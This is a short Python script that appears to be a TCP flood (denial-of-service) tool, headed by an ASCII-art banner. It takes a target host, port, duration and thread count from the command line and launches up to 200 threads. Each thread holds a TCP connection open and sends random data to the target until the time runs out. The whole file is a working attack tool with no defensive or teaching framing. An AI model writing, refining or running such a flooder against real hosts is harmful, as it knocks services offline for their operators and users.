import socket, threading, sys, os, time
from random import randint

def flood():
    host = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]

    stoptime = time.time() + int(duration)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        sock.connect((host, int(port)))
    except:
        exit()

    while time.time() < stoptime:
        try:
            sock.send(os.urandom(randint(1024, 2048)))
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
    
    sock.close()

if __name__ == '__main__':
    print('''
             /$$                 /$$        /$$$$$$$$ /$$$$$$  /$$$$$$$ 
            | $$                | $$       |__  $$__//$$__  $$| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  | $$  \__/| $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$  | $$      | $$$$$$$/
            | $$      | $$  | $$| $$   /$$$$/ | $$  | $$      | $$____/ 
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$    $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$  |  $$$$$$/| $$      
            |________/ \______/ |__/|________/|__/   \______/ |__/      
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')